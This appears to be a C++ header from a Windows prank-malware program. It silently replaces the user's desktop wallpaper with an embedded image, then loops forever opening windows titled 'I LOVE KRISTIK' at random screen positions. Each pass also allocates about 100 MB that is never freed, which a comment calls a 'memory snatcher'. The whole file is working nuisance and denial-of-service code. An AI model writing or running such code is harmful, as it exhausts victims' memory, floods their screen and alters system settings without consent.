#pragma once
#include <Windows.h>
#include <string>
#include "resource.h"
HINSTANCE kris;
HINSTANCE hMain;
HWND hWnd2;

void OverrideWallpaper() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"LOCALAPPDATA";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\img.jpg";
	LPCWSTR cont1 = fullpath1.c_str();
	HINSTANCE hInstance = kris;
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_JPG1), TEXT("jpg"));
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	LPVOID memRes = LockResource(hRes);
	DWORD sizeRes = SizeofResource(hInstance, hResInfo);
	HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten = 0;
	WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
	CloseHandle(hFile);
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)cont1, SPIF_UPDATEINIFILE);
}

LRESULT CALLBACK DialogProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
	switch (msg) {
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	default:
		return DefWindowProcW(hWnd, msg, wp, lp);
	}
}

void registerDialogClass(HINSTANCE hInst) {
	WNDCLASSW dialog = { 0 };
	dialog.hbrBackground = (HBRUSH)COLOR_WINDOW;
	dialog.hCursor = LoadCursor(NULL, IDC_WAIT);
	dialog.hInstance = hInst;
	dialog.lpszClassName = L"popup";
	dialog.lpfnWndProc = DialogProc;

	RegisterClassW(&dialog);
}
// this one is a pain in the ass so im not gonna add text.
// just deal with an empty dialog and memory snatcher
void displayDialog(HWND hWnd) {
	int x = rand() % 1920;
	int y = rand() % 1080;
	char* eater;
	eater = (char*)malloc(99999999);
	CreateWindowW(L"popup", L"I LOVE KRISTIK", WS_VISIBLE | WS_OVERLAPPEDWINDOW, x, y, 200, 200, hWnd, NULL, NULL, NULL);
}

void showDialog() {
	registerDialogClass(hMain);
	while (true) {
		displayDialog(hWnd2);
	}
}